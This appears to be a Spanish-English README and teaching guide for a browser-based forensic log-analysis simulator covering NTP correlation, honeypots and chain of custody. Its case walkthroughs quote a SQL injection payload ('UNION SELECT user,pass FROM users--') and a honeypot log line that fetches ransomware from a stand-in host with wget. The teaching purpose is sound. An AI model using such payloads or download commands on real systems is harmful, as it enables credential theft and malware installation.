# Digital Detective – Forensic Proactivity (El Detective Digital)

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
![Modo](https://img.shields.io/badge/Modo-Simulador%20Forense-critical)
![Rol](https://img.shields.io/badge/Rol-CISO%20%7C%20Analista%20Forense-informational)
![Stack](https://img.shields.io/badge/Stack-HTML%2FCSS%2FJavaScript%2FFontAwesome-blueviolet)
![Puzzle](https://img.shields.io/badge/Puzzle-NTP%20%7C%20Honey%20Pot-success)

> **Objetivo:** que el alumnado, en el rol de **CISO / analista forense**, aprenda a correlacionar **logs**, corregir desajustes de tiempo (**NTP**), usar **decepción** mediante **Honey Pot** y mantener la **cadena de custodia** etiquetando evidencias como en un caso real.

---

## Índice

1. [Descripción del simulador y del código (ES)](#1-descripción-del-simulador-y-del-código-es)  
   1.1 [Arquitectura técnica](#11-arquitectura-técnica)  
   1.2 [Interfaz principal y paneles](#12-interfaz-principal-y-paneles)  
   1.3 [Mecánica interna de simulación](#13-mecánica-interna-de-simulación)  
2. [Cómo usar la mecánica en el aula (ES)](#2-cómo-usar-la-mecánica-en-el-aula-es)  
3. [Objetivos didácticos (ES)](#3-objetivos-didácticos-es)  
4. [Resolución sugerida / guía docente (ES)](#4-resolución-sugerida--guía-docente-es)  
   - [Caso 1 – El Reloj Roto (NTP)](#caso-1--el-reloj-roto-ntp)  
   - [Caso 2 – El Eco de la Base de Datos (SQLi)](#caso-2--el-eco-de-la-base-de-datos-sqli)  
   - [Caso 3 – El Intruso Invisible (Honey Pot)](#caso-3--el-intruso-invisible-honey-pot)  
5. [Exercise overview (EN)](#5-exercise-overview-en)  
6. [How to use the exercise in class (EN)](#6-how-to-use-the-exercise-in-class-en)  
7. [Learning goals (EN)](#7-learning-goals-en)  
8. [Suggested instructor walkthrough (EN)](#8-suggested-instructor-walkthrough-en)  
9. [Licencia](#9-licencia)  
10. [Glosario de términos](#10-glosario-de-términos)  

---

## 1. Descripción del simulador y del código (ES)

### 1.1. Arquitectura técnica

- Se trata de una **single page application (SPA)** en **HTML**, **CSS** y **JavaScript**, sin backend: todo ocurre en el navegador. :contentReference[oaicite:0]{index=0}  
- Usa una paleta **“terminal / cyberpunk”** con soporte de temas mediante `data-theme="solarized"` para cambiar el aspecto visual.  
- Estructura básica:
  - **`<head>`**: carga **Font Awesome** (iconos) y define estilos del **dashboard** (grid de 3×3 paneles).  
  - **`<body>`**: contenedor principal `.dashboard-container` con:
    - Cabecera (**header-panel**).  
    - Panel de **expedientes** (lista de casos).  
    - Consola **SIEM** central.  
    - Panel de **herramientas y evidencias**.  
    - Panel inferior del **puzzle NTP**.  
- Código JavaScript:
  - Encapsulado en una **IIFE** (función autoejecutable) para no ensuciar el espacio global.  
  - Define:
    - Base de datos de **glosario** (`GLOSSARY`).  
    - Base de datos de **casos** (`CASES`), con tres casos principales escritos a mano y casos 4–20 generados de forma **procedimental**.  
    - Estado interno: `currentCase`, `evidence`, `activeLogs`, `honeyPotDeployed`.  
    - Motor de **análisis forense** (`analyzeLog`), motor de **renderizado de logs** (`renderLogs`) y gestión de **modales** (`showModal`, `openLogDetail`).  

> **Mensaje clave:** el código no es sólo un “visor de logs”; incluye lógica de **juego forense**: puzzle de **NTP**, despliegue de **Honey Pot**, etiquetado de evidencias y veredicto de “caso ganado / desestimado”.

---

### 1.2. Interfaz principal y paneles

#### 1.2.1. Cabecera – Identidad del simulador

- Zona superior con **marca**:  
  - Icono de agente secreto.  
  - Texto “**SIMULADOR FORENSE – EL DETECTIVE DIGITAL**”.  
- Muestra el **caso activo** (`CASO ACTIVO: #id TIPO`) y contadores:
  - **EVIDENCIAS** recogidas.  
  - **REQUERIDAS** para ganar el caso.  
- Botones:
  - **TEMA** → llama a `toggleTheme()` para cambiar entre tema oscuro y tema **Solarized**.  
  - **GLOSARIO** → abre una ventana con todas las definiciones del glosario interno.

#### 1.2.2. Panel izquierdo – EXPEDIENTES

- Lista de hasta **20 casos** con estilo de **carpeta**:  
  - Título (“Caso: El Reloj Roto”, “Caso: El Eco de la Base de Datos #4”, etc.).  
  - Tipo de caso (por ejemplo, **SQL Injection**, **Exfiltración**, **Ingeniería Social**, **Traffic**).  
  - Etiqueta de estado:
    - **PENDIENTE** (ámbar).  
    - **RESUELTO** (verde, con brillo).  
- Al hacer clic en un caso:
  - `loadCase(id)`:
    - Marca el expediente como **activo**.  
    - Carga los **logs** iniciales del caso.  
    - Resetea la **bolsa de evidencias**.  
    - Recoloca los deslizadores de **NTP** a 0.  
    - Habilita el botón de **Honey Pot**.  
    - Muestra un **briefing** en un modal con:
      - **SITUACIÓN**.  
      - **HIPÓTESIS** (si procede).  
      - **MISIÓN** (qué debe hacer el alumnado).

#### 1.2.3. Panel central – Consola SIEM

- Barra de herramientas:
  - Etiqueta “**SIEM CONSOLE V.4**”.  
  - Cuadro de texto “**Filtrar logs (RegEx)**” (en realidad, hace filtro por texto sencillo).  
  - Botón **CLR** para limpiar el filtro.  
- Ventana de **logs**:
  - Cada línea (`.log-line`) incluye:
    - Timestamp ajustado (`.ts`).  
    - Fuente (`.src`: `FW-PERIMETRO`, `DB-CLUSTER`, `HONEYPOT`, etc.).  
    - Mensaje (`.evt`).  
  - Colores y clases:
    - `log-info` (informativo), `log-warn` (amarillo), `log-crit` (rojo).  
    - `tagged` → evidencia etiquetada.  
    - `shifting-fw` / `shifting-auth` → feedback cuando se mueve un reloj en el puzzle **NTP**.  
- Banner de ayuda:
  - Indica explícitamente que se puede hacer clic en una línea para abrir la **LUPA FORENSE**.

#### 1.2.4. Panel derecho – Herramientas y evidencias

1. **Operación: Decepción**  
   - Explica el concepto de **Honey Pot** y de **decepción**.  
   - Botón:
     - “**DESPLEGAR SEÑUELO**” → ejecuta `deployHoneyPot()`.  
     - Si el caso requiere señuelo, tras unos segundos añade **logs HONEYPOT** a la consola.  

2. **Cadena de Custodia**  
   - Muestra las evidencias etiquetadas:
     - Fuente + resumen de mensaje.  
     - Icono de check verde.  
   - Si está vacía: mensaje “Sin evidencia recolectada”.

3. **PRESENTAR CASO**  
   - Botón grande de **PRESENTAR CASO** → llama a `submitToCourt()`.  
   - Lanza el veredicto:
     - **CASO GANADO** (icono de balanza, verde).  
     - **CASO DESESTIMADO** (icono de mazo, rojo) con explicación paso a paso de en qué ha fallado el alumnado.

#### 1.2.5. Panel inferior – Puzzle NTP

- Texto introductorio: “**PUZZLE NTP (Sincronización de Tiempo)**”.  
- Dos **sliders**:
  - **FIREWALL / ROUTER Offset** (`offset-fw`).  
  - **SERVIDOR / AUTH Offset** (`offset-auth`).  
- Cada slider:
  - Rango de `-300s` a `+300s`.  
  - Actualiza su valor visible (`0s`, `+60s`, etc.).  
  - Llama a `updateLogs()` para recalcular las horas mostradas en los logs.  
- El objetivo en muchos casos es alinear un evento de **FIREEWALL / ROUTER** con un evento de **FILE-SRV / DB-CLUSTER / SERVER** para que un juez acepte que son el **mismo incidente**.

---

### 1.3. Mecánica interna de simulación

#### 1.3.1. Base de casos

- Los tres primeros casos están escritos a mano, con narrativa clara y campos:
  - `id`, `title`, `type`, `brief`, `logs`, `extraLogs`, `solution`.  
- Casos 4–20 se generan a partir de **plantillas**:
  - Títulos como “Amanecer Rojo”, “Fuerza Bruta”, “Phishing Ejecutivo”, etc.  
  - Logs genéricos de `ROUTER` y `SERVER`.  
  - Pueden exigir:
    - Ajuste NTP (`needsNTP`).  
    - Uso de **Honey Pot** (`needsHoney`).  
    - Un número mínimo de evidencias (`tagCount`).  

#### 1.3.2. Análisis de logs (Lupa Forense)

- `analyzeLog(log)` clasifica el mensaje por patrones:
  - **Flujo de red** (`traffic allowed`, `packet flow`) → explica **NetFlow / ACL**.  
  - **Peticiones HTTP** (`GET /`, `POST /`) → explica la diferencia entre GET y POST.  
  - **Errores de SQL** (`SQL Syntax Error`, `ORA-`) → explica **SQL Injection (SQLi)**.  
  - **Fallos de login** (`failed login`, `unauthorized`) → explica ataques de **fuerza bruta**.  
  - **Eventos de HONEYPOT** (`TRAP TRIGGERED`) → explica por qué son **evidencia de alta fidelidad**.  
- Para cada log:
  - Texto **técnico**.  
  - Versión en **lenguaje claro**.  
  - **Consejo forense** (qué hacer con ese log).  
- La ventana modal **LUPA FORENSE** muestra todo esto y permite **etiquetar / des-etiquetar** la línea como evidencia.

#### 1.3.3. Etiquetado de evidencias

- El conjunto `evidence` guarda los IDs de logs etiquetados.  
- `updateEvidenceList()`:
  - Actualiza la lista en “Cadena de Custodia”.  
  - Actualiza el contador de evidencias en la cabecera.  
- En `renderLogs()`:
  - Las líneas etiquetadas se marcan como `.tagged`, con icono de **tag**.  

#### 1.3.4. Decepción y Honey Pot

- `deployHoneyPot()`:
  - Si el caso tiene `needsHoney = true` y `extraLogs`:
    - Cambia el botón a “DESPLEGANDO...”.  
    - Tras 1.5 segundos:
      - Añade logs de `HONEYPOT` a `activeLogs`.  
      - Marca `honeyPotDeployed = true`.  
      - Muestra un modal de “OPERACIÓN DECEPCIÓN EXITOSA”.  
  - Si el caso **no** necesita señuelo:
    - Muestra un modal indicando que el señuelo no ha captado nada.  
    - Deshabilita el botón (para que el alumnado entienda que no siempre es necesario).  

#### 1.3.5. Evaluación y veredicto

`submitToCourt()` calcula una puntuación basada en tres ejes:

1. **NTP (si el caso lo requiere)**  
   - Compara los offsets de usuario (`offset-fw`, `offset-auth`) con los offsets objetivo (`fwOffset`, `authOffset`) de la solución.  
   - Acepta un margen de error de ±15 segundos.  

2. **Honey Pot (si el caso lo requiere)**  
   - Comprueba si se ha desplegado el señuelo (`honeyPotDeployed`).  

3. **Evidencias etiquetadas**  
   - Comprueba si `evidence.length` ≥ `solution.tagCount`.  

Si las tres condiciones se cumplen (puntuación **≥ 3**):

- Modal “**¡CASO GANADO!**”.  
- Actualiza el expediente a **RESUELTO**.  

Si falla alguna:

- Modal “**CASO DESESTIMADO POR EL JUEZ**” con bloques de corrección:
  - **Fallo de Sincronización Temporal (NTP)**.  
  - **Falta de Atribución (Decepción)**.  
  - **Ruptura de Cadena de Custodia**.  
- Cada bloque incluye:
  - Qué hacer para corregirlo.  
  - Explicación de **realismo legal / forense**.

---

## 2. Cómo usar la mecánica en el aula (ES)

1. **Introducción (5–10 min)**  
   - Explicar el concepto de **CISO / analista forense**.  
   - Leer (o resumir) el **MANIFIESTO DEL DETECTIVE DIGITAL** que aparece al inicio:
     - No queremos ser sólo “**Bomberos**” (bloquear IPs).  
     - Queremos ser **Detectives** (seguir, engañar y atribuir al atacante).  

2. **Explorar la interfaz**  
   - Mostrar la cabecera (caso activo, contador de evidencias).  
   - Explicar la **lista de expedientes** y el significado de “PENDIENTE / RESUELTO”.  
   - Visitar la consola **SIEM** y cómo se leen las columnas: hora, fuente, evento.  
   - Enseñar el panel de **herramientas** y la **Cadena de Custodia**.  
   - Comentar el **puzzle NTP** y por qué sincronizar relojes es vital en un juicio.

3. **Primer caso guiado por el docente**  
   - Seleccionar el **Caso 1 – El Reloj Roto**.  
   - Leer la narrativa de SITUACIÓN / HIPÓTESIS / MISIÓN.  
   - Demostrar cómo:
     - Mover los sliders de **NTP**.  
     - Abrir la **LUPA FORENSE** y leer análisis técnico y “lenguaje claro”.  
     - Etiquetar una evidencia y verla aparecer en la bolsa de evidencias.  
   - No desplegar aún el **Honey Pot** (no es necesario en este caso).

4. **Trabajo en parejas o grupos pequeños**  
   - Repartir **casos** diferentes entre grupos (por ejemplo, 1–3 asignados, o 1–6 si hay tiempo).  
   - Para cada caso, el grupo debe:
     1. Leer el briefing.  
     2. Decidir si hay que ajustar **NTP** o no.  
     3. Decidir si tiene sentido desplegar el **Honey Pot**.  
     4. Examinar los logs con la **LUPA FORENSE** y etiquetar las líneas clave.  
     5. Pulsar **PRESENTAR CASO** y analizar el veredicto.  
     6. Repetir ajustes hasta conseguir “CASO GANADO”.

5. **Puesta en común y discusión**  
   - Preguntas sugeridas:
     - ¿En qué casos el **NTP** fue crítico y en cuáles no?  
     - ¿Qué tipo de logs resultaron más útiles: **Firewalls / Router**, **DB**, **HONEYPOT**?  
     - ¿Cuándo es imprescindible desplegar **Honey Pot** y cuándo no aporta valor?  
     - ¿Algún grupo perdió el caso por falta de evidencias etiquetadas? ¿Por qué?

6. **Cierre**  
   - Conectar la experiencia con:
     - **Cadena de custodia** real.  
     - Expectativas de un **juez / auditor** ante un incidente.  
     - Diferencia entre “bloquear rápidamente” y “preparar un caso sólido”.

---

## 3. Objetivos didácticos (ES)

1. Comprender el papel del **CISO / analista forense** en la recopilación y presentación de evidencias.  
2. Entender la importancia de **NTP** y la sincronización de relojes en la correlación de **logs**.  
3. Diferenciar entre:
   - **Medidas defensivas reactivas** (bloquear IP, apagar servidor).  
   - **Medidas proactivas de decepción** (**Honey Pot** y captura de TTPs).  
4. Practicar la lectura de logs técnicos y su traducción a un relato comprensible para alguien no técnico (por ejemplo, un juez).  
5. Interiorizar el concepto de **cadena de custodia**: etiquetar evidencias sin manipularlas.  
6. Explorar el uso de **SIEM** como consola centralizada de eventos.  
7. Desarrollar habilidades de razonamiento forense:
   - HIPÓTESIS → BÚSQUEDA DE EVIDENCIA → COMPROBACIÓN → VEREDICTO.

---

## 4. Resolución sugerida / guía docente (ES)

> No hay una única “solución perfecta”, pero sí una lógica de referencia para los tres primeros casos.

### Caso 1 – El Reloj Roto (NTP)

**SITUACIÓN:**  
El CFO dice que hubo acceso a sus archivos a las 10:00:00, pero el **Firewall** no registra nada a esa hora; su último log es 09:59:00.

**Lógica de resolución (paso a paso):**

1. **Abrir el caso 1** y leer el briefing.  
2. Observar que los logs de `FW-PERIMETRO` están a las 09:59:xx y los de `FILE-SRV` a las 10:00:xx.  
3. Explicar que puede haber un **offset** de tiempo: el firewall va **60 segundos retrasado**.  
4. Mover el slider **FIREWALL / ROUTER Offset** a **+60s** (el valor objetivo es `fwOffset = 60`).  
5. Comprobar que la hora que aparece en los logs de `FW-PERIMETRO` se alinea ahora alrededor de las 10:00:xx.  
6. Abrir con la **LUPA FORENSE**:
   - Una línea del firewall que permite tráfico desde `192.168.1.50` a `FILE-SRV 443`.  
   - Una línea de `FILE-SRV` con acceso de usuario `CFO`.  
7. Usar el botón “**ETIQUETAR COMO EVIDENCIA**” en ambas.  
8. Confirmar que en “Cadena de Custodia” aparecen al menos **2 evidencias**.  
9. Pulsar **PRESENTAR CASO**:
   - Si todo está correcto, el veredicto debería ser **CASO GANADO**.

**Mensaje pedagógico:**  
Sin **NTP**, dos logs aparentemente distintos pueden ser el mismo evento. El foco no es el firewall rechazando o no, sino **alinear relojes**.

---

### Caso 2 – El Eco de la Base de Datos (SQLi)

**SITUACIÓN:**  
Servidor web generando errores raros; alguien podría estar realizando **SQL Injection (SQLi)**.

**Lógica de resolución:**

1. Seleccionar caso 2 y leer la misión: no hace falta tocar NTP.  
2. Buscar patrones de **SQLi**:
   - En `WAF`: `GET /search?q=iphone' UNION SELECT user,pass FROM users--`  
   - En `DB-CLUSTER`: `SQL Syntax Error: ORA-01790...`  
3. Abrir la **LUPA FORENSE** para la línea de error de SQL:
   - Ver que el análisis técnico aclara que un usuario normal no provoca errores de sintaxis.  
   - El consejo forense indica que es **evidencia crítica**.  
4. Etiquetar:
   - La petición maliciosa en el **WAF**.  
   - El error de **DB-CLUSTER** (“SQL Syntax Error”).  
5. Confirmar que las evidencias aparecen en la bolsa.  
6. Comprobar que los sliders NTP están en `0s` (no es un puzzle de tiempo).  
7. Pulsar **PRESENTAR CASO**:
   - Debe reconocer suficientes evidencias y dar **CASO GANADO**.

**Mensaje pedagógico:**  
Un error de sintaxis SQL provocado por entrada del usuario es **rastro de ataque**, no de uso legítimo.  

---

### Caso 3 – El Intruso Invisible (Honey Pot)

**SITUACIÓN:**  
El atacante ya está dentro de la red interna (movimiento lateral). Los logs sólo muestran **scans** e intentos de login fallidos.

**Resolución (centrada en decepción):**

1. Seleccionar caso 3 y leer la misión: lo actual **no basta**; hay que desplegar un **Honey Pot**.  
2. Desde el panel derecho, pulsar **DESPLEGAR SEÑUELO**:
   - El botón muestra “DESPLEGANDO...”.  
   - Tras unos segundos, aparecen nuevos logs con fuente `HONEYPOT`.  
3. En la consola **SIEM**, localizar los logs de `HONEYPOT`:
   - `** TRAP TRIGGERED ** Connection accepted from 10.0.5.99 (Attacker IP)`  
   - Descarga de malware (`wget http://evil-c2.com/ransomware.exe`).  
   - Captura de hash de malware.  
4. Abrir la **LUPA FORENSE** en uno de esos eventos (por ejemplo, “TRAP TRIGGERED”):
   - Leer el análisis: son **evidencias de alta fidelidad**, porque nadie legítimo debería acceder al señuelo.  
5. Etiquetar al menos uno de esos logs como evidencia.  
6. Pulsar **PRESENTAR CASO**:
   - Si `honeyPotDeployed = true` y hay suficientes evidencias, debería finalizar en **CASO GANADO**.  

**Mensaje pedagógico:**  
Los logs defensivos pueden decir “golpearon la puerta”; el **Honey Pot** dice “quién fue, desde dónde y con qué herramienta”.

---

## 5. Exercise overview (EN)

The **Digital Detective – Forensic Proactivity** simulator is a browser-only **SPA** designed to teach **CISO / forensic analysts** how to:

- Correlate **logs** coming from **firewalls**, **servers**, **databases** and **honeypots**.  
- Fix **time desynchronization** issues using an **NTP offset puzzle**.  
- Use **deception techniques** (deploying a **Honey Pot**) to obtain high-fidelity evidence.  
- Preserve the **chain of custody** by **tagging** relevant events instead of editing or deleting them.  

The main loop per case is:

1. Pick a **case file** from the left panel.  
2. Read the **SITUATION / HYPOTHESIS / MISSION**.  
3. Adjust **NTP offsets** if required.  
4. Deploy the **Honey Pot** when the current logs are not enough.  
5. Use the **forensic magnifier** to analyse and tag evidence.  
6. Press **PRESENTAR CASO** and get a **court-style verdict** (“Case Won” vs “Dismissed”).

---

## 6. How to use the exercise in class (EN)

- Start with **Case 1** and do a full walkthrough focusing on **NTP** and log correlation.  
- Use **Case 2** to highlight **SQL Injection** and the role of **database error logs**.  
- Use **Case 3** to show why and when a **Honey Pot** is necessary to move from “noise” to **attribution**.  
- Let students play with auto-generated cases (4–20) in groups, documenting:
  - Their chosen **NTP offsets**.  
  - Whether they deployed **Honey Pot** or not.  
  - Which **evidence** they tagged and why.  
- Close with a **group debrief** comparing different strategies and verdicts.

---

## 7. Learning goals (EN)

- Understand the **forensic implications** of unsynchronized logs (**NTP**).  
- Recognize typical patterns of **SQLi**, **brute-force** and **lateral movement** in logs.  
- Appreciate the value of **deception / Honey Pots** for attribution and evidence quality.  
- Practise transforming technical log data into a **legal-quality narrative**.  
- Reinforce the mindset of preserving **chain of custody** instead of “cleaning up” systems too early.

---

## 8. Suggested instructor walkthrough (EN)

1. **Phase 1 – Training**  
   - Use the initial training modal (“MANIFIESTO DEL DETECTIVE DIGITAL”) to set the tone: **Detective vs Firefighter**.  

2. **Phase 2 – NTP puzzle**  
   - Solve **Case 1** together, using the NTP sliders and showing how a ±60s offset changes the story.  

3. **Phase 3 – Application layer attacks**  
   - Solve **Case 2**, focusing on HTTP / SQL logs and the **SQL error** as a smoking gun.  

4. **Phase 4 – Deception and Honey Pot**  
   - Solve **Case 3**, emphasising **lateral movement** and the role of Honey Pots.  

5. **Phase 5 – Free play**  
   - Let students tackle more cases on their own or in teams, then do a **post-incident review** comparing outcomes.

---

## 9. Licencia

Este recurso (código del simulador y este documento) se publica bajo **licencia MIT**, que permite:

- Usar el software con cualquier propósito.  
- Copiarlo y redistribuirlo.  
- Modificarlo y crear obras derivadas.  

Siempre que se conserve el aviso de copyright y el texto completo de la licencia.

```text
MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files...
```

---

## 10\. Glosario de términos

> Términos técnicos o en inglés usados en el simulador y en este documento, explicados en castellano.

-   **Analista forense / forensic analyst**: profesional que investiga incidentes de seguridad recopilando, analizando y preservando evidencias digitales.
    
-   **API (Application Programming Interface)**: interfaz que permite que dos programas se comuniquen entre sí a través de peticiones bien definidas.
    
-   **Asset / activo**: elemento valioso de la organización (servidor, base de datos, aplicación, etc.) que debe protegerse.
    
-   **Backend**: parte de una aplicación que se ejecuta en el servidor (lógica de negocio, base de datos). En este simulador no hay backend; todo es frontend.
    
-   **Brute force / fuerza bruta**: técnica de ataque que prueba muchas combinaciones de usuario y contraseña hasta acertar.
    
-   **Cadena de Custodia (Chain of Custody)**: proceso formal que garantiza que una evidencia digital no ha sido alterada desde su recogida hasta su presentación en juicio.
    
-   **Case / caso / expediente**: escenario de investigación específico con su propia historia, logs y solución.
    
-   **CISO (Chief Information Security Officer)**: máximo responsable de la seguridad de la información en una organización.
    
-   **CISO Command Center**: nombre genérico que el código usa para la “sala de mando” desde la que el CISO coordina la defensa; aquí es la consola de simulación.
    
-   **Console / consola**: interfaz de texto o gráfica desde la que se observan y gestionan eventos, logs y herramientas.
    
-   **CSS (Cascading Style Sheets)**: lenguaje de estilos para definir colores, tamaños, fuentes y disposición de elementos en una página web.
    
-   **Dashboard**: panel de control con múltiples indicadores y paneles que muestran el estado de un sistema.
    
-   **DDoS (Distributed Denial of Service)**: ataque distribuido que intenta dejar un servicio inaccesible saturándolo con tráfico.
    
-   **Decepción (deception)**: estrategia de seguridad que consiste en engañar al atacante (por ejemplo, con sistemas falsos) para observar su comportamiento y recopilar evidencias.
    
-   **Detective (estrategia)**: en el contexto del simulador, enfoque proactivo que busca seguir y atribuir al atacante, no sólo bloquearlo.
    
-   **Día / turno de simulación**: en otros simuladores representa un paso de tiempo; aquí cada **caso** representa una mini-historia independiente.
    
-   **DNS, HTTP, TCP/IP**: protocolos de red (no aparecen con detalle en el código, pero se mencionan indirectamente en los logs; se dan por conocidos en nivel intermedio).
    
-   **Error SQL / SQL Syntax Error**: mensaje de error que indica que una consulta a la base de datos está mal formada; en este contexto es síntoma típico de ataque de inyección SQL.
    
-   **Evidence / evidencia**: registro, archivo o dato que sirve para demostrar qué ha ocurrido en un incidente.
    
-   **Etiqueta / tag / etiquetar**: marcar un elemento (log, evento) como importante, sin modificarlo, para preservar la cadena de custodia.
    
-   **Exfiltración (exfiltration)**: robo de datos desde el interior de una red hacia el exterior.
    
-   **Firewall**: dispositivo o software que filtra el tráfico de red según reglas predefinidas (permitir / denegar).
    
-   **Font Awesome**: biblioteca de iconos vectoriales utilizada para mostrar iconos de mazo, escudo, araña, etc.
    
-   **Forense (forensic)**: relativo a la investigación de incidentes de seguridad con estándar de prueba apto para un tribunal.
    
-   **Frontend**: parte de una aplicación que se ejecuta en el navegador del usuario (HTML, CSS, JavaScript).
    
-   **GET / POST**: métodos HTTP; GET suele usarse para leer datos y POST para enviar datos (por ejemplo, formularios).
    
-   **Grid**: rejilla de maquetación que coloca elementos en filas y columnas.
    
-   **Header / cabecera**: parte superior de una interfaz donde suele aparecer el título y los indicadores globales.
    
-   **Heatmap**: representación visual en la que el color indica intensidad o estado; aquí hay una sensación de “heatmap” en la consola de logs y estados, aunque no se usa un heatmap gráfico puro.
    
-   **Honey Pot**: sistema trampa deliberadamente expuesto para atraer atacantes; todo tráfico hacia él se considera malicioso por definición.
    
-   **HTML (HyperText Markup Language)**: lenguaje que define la estructura y contenido básico de una página web.
    
-   **HTTP (HyperText Transfer Protocol)**: protocolo de comunicación usado por la web para peticiones y respuestas entre cliente y servidor.
    
-   **Icono**: representación visual pequeña (procedente de **Font Awesome**) que indica acciones o tipos de elementos.
    
-   **IIFE (Immediately Invoked Function Expression)**: función de JavaScript que se ejecuta justo después de ser definida, aislando su scope.
    
-   **Ingeniería Social (social engineering)**: técnicas que atacan al factor humano (engaños, correos de phishing) para conseguir credenciales o datos.
    
-   **JavaScript**: lenguaje de programación que se ejecuta en el navegador y dota de lógica e interactividad a la página.
    
-   **JSON**: formato de datos ligero que estructuras como `CASES` usan internamente (objetos con llaves y valores).
    
-   **Lateral movement / Movimiento Lateral**: fase del ataque en la que un intruso ya dentro de la red se desplaza entre sistemas internos para llegar a activos más críticos.
    
-   **Layout**: disposición visual de los componentes en la pantalla.
    
-   **Log**: registro textual de lo que ha ocurrido en un sistema (fecha, origen, mensaje).
    
-   **Log-crit / log-warn / log-info**: clases CSS utilizadas para colorear líneas de log según su severidad: crítica, aviso, informativa.
    
-   **Lupa Forense**: nombre de la ventana emergente (modal) que da detalle y análisis de una línea de log concreta.
    
-   **Malware**: software malicioso (virus, troyanos, ransomware, etc.).
    
-   **Modal**: ventana superpuesta sobre la interfaz principal que bloquea la interacción hasta que se cierra.
    
-   **Movimiento lateral**: ver **Lateral movement**.
    
-   **NTP (Network Time Protocol)**: protocolo que sincroniza relojes de equipos en red para que las horas de log sean coherentes entre sistemas distintos.
    
-   **Offset (desfase)**: diferencia en segundos entre el reloj real y el reloj de un sistema; en el simulador se corrige con sliders.
    
-   **Phishing**: correos o mensajes fraudulentos que intentan engañar a las personas para que revelen credenciales o instalen malware.
    
-   **POST-incident review / post-mortem**: análisis formal que se hace después de un incidente para aprender y mejorar procesos.
    
-   **RegEx (Regular Expression / expresión regular)**: patrón de búsqueda avanzado para localizar texto; el input de filtro menciona RegEx aunque el código usa un filtro simple por texto.
    
-   **Ransomware**: tipo de malware que cifra archivos y exige un pago (normalmente en criptomonedas) para recuperar el acceso.
    
-   **Router**: dispositivo de red que enruta paquetes entre redes distintas (por ejemplo, entre LAN y WAN).
    
-   **Server / servidor**: máquina (física o virtual) que presta servicios a otros equipos (web, base de datos, autenticación).
    
-   **SIEM (Security Information and Event Management)**: sistema que centraliza logs de múltiples fuentes de seguridad para correlacionarlos y analizarlos.
    
-   **Single Page Application (SPA)**: aplicación web que se carga una vez y actualiza el contenido dinámicamente, sin recargar toda la página.
    
-   **Slider / deslizador**: control gráfico que permite variar un valor moviendo un cursor horizontalmente (aquí, offsets de NTP).
    
-   **SQL (Structured Query Language)**: lenguaje de consultas para bases de datos relacionales.
    
-   **SQL Injection (SQLi)**: ataque que introduce comandos SQL maliciosos en entradas de usuario para manipular la base de datos.
    
-   **Syntax Error / error de sintaxis**: error que ocurre cuando el código (por ejemplo, una consulta SQL) no cumple las reglas del lenguaje.
    
-   **Tarro de miel / Honey Pot**: ver **Honey Pot**; traducción coloquial.
    
-   **Terminal**: interfaz de texto donde se escriben comandos; la estética del simulador imita una terminal.
    
-   **Theme / tema**: conjunto de colores y estilos visuales; aquí se puede alternar entre oscuro y solarizado con el botón TEMA.
    
-   **Tooltip / mensaje de ayuda**: pequeño texto explicativo que aparece o se lee al pasar por un elemento o al abrir una ventana de ayuda.
    
-   **Traffic / tráfico**: volumen de peticiones y datos que viajan por la red.
    
-   **TTPs (Tactics, Techniques and Procedures)**: tácticas, técnicas y procedimientos de un atacante, observables en su comportamiento (por ejemplo, comandos que ejecuta en un Honey Pot).
    
-   **UI (User Interface) / interfaz de usuario**: conjunto de elementos visibles con los que la persona interactúa (botones, paneles, sliders, etc.).
    
-   **UNION SELECT**: parte de una sentencia SQL usada frecuentemente en ataques de inyección para combinar resultados de tablas distintas.
    
-   **Veredicto**: decisión final sobre el caso; aquí se representa como “CASO GANADO” o “CASO DESESTIMADO”.
    
-   **Warn / warning / aviso**: nivel intermedio de severidad de log; indica algo potencialmente problemático, pero no tan grave como `crit`.
